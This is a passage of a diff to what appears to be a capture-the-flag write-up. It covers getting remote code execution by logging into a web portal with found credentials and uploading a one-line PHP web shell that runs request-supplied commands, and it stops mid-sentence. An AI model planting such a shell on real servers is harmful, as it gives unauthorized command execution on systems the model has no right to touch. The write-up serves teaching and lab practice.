@@ -376,7 +376,16 @@ I now understand why the guest account did not work, this is becuase the box was
 
 # Remote code execution
 
-The creds 
+The creds also get me access to the web portal as the technician
 
+```python
+❯❯❯ cat phpshell.php     
+<?php system($_REQUEST['cmd']); ?>
+```
 
+There is a section to upload files, ill try a PHP web shell
+
+![](Pasted%20image%2020261111195959.png)
+
+After running feroxbuster earlier i found the uploads endpoint s
 
